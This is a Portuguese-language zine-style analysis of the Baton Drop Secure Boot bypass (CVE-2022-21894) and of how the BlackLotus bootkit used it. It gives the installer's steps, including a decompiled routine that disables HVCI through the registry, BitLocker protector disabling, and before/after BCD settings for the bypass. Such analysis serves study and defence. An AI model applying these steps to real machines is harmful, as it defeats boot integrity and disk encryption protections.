    <g2>░░<ww>░<g1><ww>   | <a href="https://github.com/Wack0/CVE-2022-21894">https://github.com/Wack0/CVE-2022-21894                        |    ·</a><g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [*]--------------------------------------------------------------[*]   ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Publicada em 11 de Janeiro de 2022, A CVE-2022-21894 (Baton Drop)      <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  descoberta pelo brilhante Wack0, consiste em um bypass que quebra as   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  políticas do SecureBoot, permitindo que um atacante manipulasse o      ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  processo de carregamento dessas policies antes delas serem             ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  carregadas na memória da máquina. A vulnerabilidade é baseada e faz    <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  parte de um conjunto de outras CVEs e pesquisas do próprio Wack0 e     <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  outros pesquisadores sobre falhas no processo de SecureBoot (em        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  março de 2023 ele apresentou uma palestra[4] sobre essas pesquisas e   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  uma explicação mais detalhada e profunda sobre a exploração da Baton   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  Drop, que a gente vai ver de forma mais resumida e simples agorinha,   <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  então recomendo fortemente você assistir!!).                           ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Em 10 de Agosto do mesmo ano, o Wack0 sobe no GitHub o disclosure      <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  junto com uma PoC da exploração da Baton Drop, explicando para nós     ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  mortais sobre todo funcionamento dessa vulnerabilidade e como          ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  explorá-la:                                                            <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  A Baton Drop consiste em abusar de aplicações UEFI vulneráveis no      <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Windows e configurações armazenadas nos BCDs para remover blocos de    <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  memória contendo dados serializados do memory map, esses dados sendo   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  a SecureBoot Policy. O atributo truncatememory passado em um BCD,      <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  permite remover toda memória acima de um endereço de memória físico    ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  do memory map antes da SecureBoot Policy ser lida da memória. Dessa    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  forma, esse atributo pode ser utilizado para remover a policy          <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  serializada do memory map, fazendo com que outros atributos            <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  “perigosos” (como bootdebug, testsigning, nointegritychecks) possam   <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  ser carregados pelo bootloader, assim quebrando o SecureBoot. Para     ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  que a exploração seja efetuada com sucesso, o atacante deve ter        <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  certeza que a policy serializada esteja alocada acima de um endereço   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  físico conhecido, para resolver essa questão, o atributo               ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  avoidlowmemory pode ser usado para garantir que alocações de memória   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  física estejam acima de um endereço físico especificado. Além desse    ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  bypass, a UEFI application hvloader.efi pode ser carregada com o       <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  atributo nointegritychecks já mencionado para carregar uma DLL         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  auto-assinada (mcupdate.dll, cujo entry point é chamado antes da       ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  função ExitBootServices()) para realizar execução de código na         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  máquina. Essa exploração também permite realizar o dump das chaves     ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  do BitLocker, e embora o método para realização deste não tenha sido   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  divulgado, o Wack0 falou sobre na palestra que eu citei mais cedo.     ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [*]--------------------------------------------------------------[*]   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   |  3. O mito se torna realidade: BlackLotus                      |    <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  [*]--------------------------------------------------------------[*]   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                  “O primeiro bootkit UEFI descoberto                    <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>                in-the-wild que subverte as proteções de                 <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                       SecureBoot em sistemas UEFI                       ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>                100% atualizados agora é uma realidade”                  <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                                 - Martin Smolár, ESET (traduzido)       ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  A CVE já havia sido publicada, o exploit divulgado e a Microsoft já    <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  havia lançado um “patch” para mitigar essa falha no Windows, porém,    <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  como o problema envolve aplicações UEFI vulneráveis, mesmo em um       <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  sistema atualizado, o que aconteceria se um atacante criativo          <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  decidisse manualmente injetar essas aplicações vulneráveis no          ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  sistema? Foi então que um pequeno trombadinha virtual chamado          ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  “maxwell187”, anunciou no dia 6 de Outubro de 2022 no eXploit[5], que  <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  estava vendendo um UEFI bootkit com um bypass integrado de             ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  SecureBoot, bypass esse sendo a CVE do Wack0! O nome desse malware?    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  BlackLotus (onde estão meus manos do Magic?).                          ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  O BlackLotus realmente foi uma surpresa para muitos analistas em       ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  2022, visto que um malware que subvertia as proteções do SecureBoot    ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  em sistemas UEFI atualizados parecia conto de fadas. Seu impacto na    ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  comunidade foi grande o suficiente para chamar a atenção da NSA, que   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  até liberou uma nota de mitigação para a ameaça. Aqui eu vou focar     ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  em explicar sobre como o BlackLotus utilizou o exploit desenvolvido    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  pelo Wack0 na sua cadeia de infecção, mas também vou deixar linkado    <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  um artigo[6] escrito pelo Martin Smolár[7] da ESET sobre uma análise   ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  completa do malware, que pra quem se interessar, recomendo             <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  fortemente a leitura :]                                                ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [*]-----------------------------------[*]                              ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   |  3.1 Instalação                     |                               ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [*]-----------------------------------[*]                              ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  ㄴ Etapa 0 - Instalador                                                 <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ O instalador primeiro verifica seus privilégios, e caso ele         <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   esteja com um nível baixo, executa um UAC Bypass[8] para              <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   escalar privilégios;                                                  <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   ㄴ Checa a presença do SecureBoot utilizando a Win32API, caso o        ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   dispositivo não esteja protegido, já inicia a etapa de                ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   persistência;                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>   ㄴ Renomeia o Windows Boot Manager (bootmgfw.efi) para                 <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   “winload.efi” e reinicia a máquina (uma forma de backup caso o        <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   processo de exploração seja interrompido ou o operador do malware     <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   deseje desinstalar ele da máquina da vítima).                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  ㄴ Etapa 1 - Deploy                                                     <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   ㄴ Implanta arquivos em dois diretórios da máquina:                    <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>    ㄴ ESP:\EFI\Microsoft\Boot\ (ESP UEFI padrão da Microsoft)            ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>    ㄴ ESP:\system32\ (ESP criado pelo instalador)                        <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [*] - Malicioso                                                        ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  [**] - Legítimo, mas vulnerável                                        <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [***] - Legítimo e não vulnerável                                      <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +-------------------------------------------------------------------+  ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | Diretório              | Arquivos        | Descrição              |  <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  |ESP:\EFI\Microsoft\Boot\|grubx64.efi[*]   | BlackLotus bootkit     |  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  |ESP:\EFI\Microsoft\Boot\|bootload.efi[***]|Binário shim assinado   |  ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |ESP:\EFI\Microsoft\Boot\|bootmgfw.efi[**] |Windows Boot Manager (1)|  ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  |ESP:\EFI\Microsoft\Boot\|BCD[*]           |BCD do atacante (1)     |  ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  |ESP:\EFI\Microsoft\Boot\|BCDR[***]        |Backup do BCD da vítima |  ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |ESP:\system32           |hvloader.efi[**] |WinHypervisor Loader    |  ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  +------------------------+-----------------+------------------------+  ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |ESP:\system32           |bootmgr.efi[**]  |Windows Boot Manager (2)|  ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +------------------------+-----------------+------------------------+  ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |ESP:\system32           |mcupdate.dll[*]  |DLL usada no exploit    |  <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |ESP:\system32           |BCD[*]           |BCD do atacante (2)     |  ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +------------------------+-----------------+------------------------+  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  ㄴ Etapa 2 - Desativando o HVCI                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   ㄴ O HVCI (Integridade de Memória/Hypervisor Enforced Code             <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   Integrity) é um recurso da VBS (Segurança Baseada em                  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   Virtualização/Virtualization Based Security) utilizado para           ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   proteção contra manipulações de memória em kernel mode;               ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   ㄴ O instalador define o valor de registro Enabled da chave de         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   registro do HVCI para 0:                                              ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>   int DisableHypervisorEnforcedCodeIntegrity() {                        ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     KeyHandle = 0i64;                                                   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>     Value = 0;                                                          ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     //\Registry\Machine\SYSTEM\CurrentControlSet\Control\DeviceGuar     <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>     d\Scenarios\HypervisorEnforcedCodeIntegrity v0 =                    ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>         DecryptStr(&amp;unk_140009C30, 0x69u, 1);                           ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     RtlInitUnicodeString(&amp;v3, v0);                                      <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>     ObjectAttributes.RootDirectory = 0i64;                              ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     ObjectAttributes.ObjectName = &amp;v3;                                  ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>     ObjectAttributes.Length = 48;                                       <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>     ObjectAttributes.Attributes = 64;                                   <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>     *&amp;ObjectAttributes.SecurityDescriptor = 0i64;                       <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>     result = ZwOpenKey(&amp;KeyHandle, 0xF003Fu, &amp;ObjectAttributes);        <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>     if (result &gt;= 0) {                                                  <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>       v2 = DecryptStr(&amp;unk_140009D08, 8u, 1);  // “Enabled”             <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>       RtlInitUnicodeString(&amp;ValueName, v2);                             ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>       ZwSetValueKey(KeyHandle, &amp;ValueName, 0, 4u, &amp;Value, 4u);          <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>       return ZwClose(KeyHandle);  // “0”                                <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     }                                                                   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>     return result;                                                      ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   }                                                                     ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  ㄴ Etapa 3 - Desativando o BitLocker                                    ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   ㄴ O BitLocker é o recurso nativo de criptografia de volumes do        <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   Windows (o BitLocker está para o Windows como o VeraCrypt está        ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   para o Linux), ele é usado em conjunto da TPM (Trusted Platform       ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   Unset                                                                 <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   Module, sem piadinhas dessa vez), que é um criptoprocessador que      <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   realiza funções criptográficas na máquina, criando e armazenando      ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   chaves para confirmar se o SO e o firmware não foram adulterados      <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   enquanto o sistema estiver offline;                                   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>   ㄴ O instalador caminha por todos os volumes no WMI                    ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   (Instrumentação de Gerenciamento do Windows/Windows Management        ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   Instrumentation) namespace Root\CIMV2\Security\                       <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>   MicrosoftVolumeEncryption e checa seus status de proteção;            <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ Para os volumes protegido pelo BitLocker, ele chama o método        ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   DisableKeyProtectors() com o parâmetro DisableCount alterado para     <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>   zero.                                                                 <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  ㄴ Etapa 4 - Reiniciar a máquina                                        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   ㄴ ¯\_(ツ)_/¯                                                           <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [*]-----------------------------------[*]                              ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   |  3.2 “Dropping the baton”           |                               ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [*]-----------------------------------[*]                              ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  ㄴ Exploitation                                                         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ Após reiniciar a máquina, o sistema executa o bootmgfw.efi          <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   implantado pelo instalador;                                           ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ Após a execução do arquivo, ele carrega o primeiro BCD              ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   implantado no diretório ESP:\EFI\Microsoft\Boot\;                     <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   ㄴ O Windows Boot Manager segue para carregar o ESP:\system32\         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   bootmgr.efi com os elementos do primeiro BCD:                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   avoidlowmemory:0x10000000 e custom:22000023 (esse argumento           ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   apontando para o segundo BCD guardado no diretório                    ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   ESP:\system32\);                                                      <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>         ANTES DA EXPLORAÇÃO                                             ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Windows Boot Manager                                                   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  --------------------                                                   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  identifier              {bootmgr}                                      ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  device                  partition=\Device\HarddiskVolume2              <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  path                    \EFI\Microsoft\Boot\bootmgfw.efi               <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  description             Windows Boot Manager                           <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  locale                  en-US                                          ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  inherit                 {globalsettings}                               <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  default                 {current}                                      <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  resumeobject            {499d02c2-23e9-11ec-81bc-c8c171fb7d17}         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  displayorder            {current}                                      <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  tooldisplayorder        {memdiag}                                      <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  timeout                 30                                             <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  Windows Boot Loader                                                    <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  -------------------                                                    ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  identifier              {current}                                      ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  device                  partition=C:                                   <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  path                    \WINDOWS\system32\winload.efi                  <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  description             Windows 10                                     ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  locale                  en-US                                          ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  inherit                 {bootloadersettings}                           <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  recoverysequence        {499d02c2-23e9-11ec-81bc-c8c171fb7d17}         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  displaymessageoverride  Recovery                                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  recoveryenabled         Yes                                            <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  isolatedcontext         Yes                                            <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  allowedinmemorysettings 0x15000075                                     ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  osdevice                partition=C:                                   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  systemroot              \WINDOWS                                       ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  resumeobject            {499d02c2-23e9-11ec-81bc-c8c171fb7d17}         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  nx                      OptIn                                          <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  bootmenupolicy          Standard                                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  hypervisorlaunchtype    Auto                                           ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>         DEPOIS DA EXPLORAÇÃO                                            <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  Windows Boot Manager                                                   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  --------------------                                                   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  identifier              {bootmgr}                                      <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  description             Windows Boot Manager                           <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  locale                  en-US                                          <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  inherit                 {globalsettings}                               <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  bootdebug               No                                             <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  displayorder            {527f84fc-036e-11ec-abb0-005056c00008}         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  timeout                 30                                             <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Windows Boot Loader                                                    <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  -------------------                                                    <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  identifier              {527f84fc-036e-11ec-abb0-005056c00008}         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  device                  boot                                           <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  path                    \system32\bootmgr.efi &lt;---                     <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  description             RIP the woo                                    ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  locale                  en-US                                          ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  inherit                 {bootloadersettings}                           ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  avoidlowmemory          0x10000000 &lt;---                                <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  bootdebug               No                                             <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  isolatedcontext         Yes                                            <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  custom:22000023         \system32\bcd &lt;---                             ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  ems                     Yes                                            <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  ㄴ O bootmgr.efi executado então carrega o segundo BCD com os           ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  parâmetros truncatememory:0x10000000, nointegritychecks:Yes e          ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  testsigning:Yes;                                                       <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         ░<g1>░<g2>░<g1><ww>
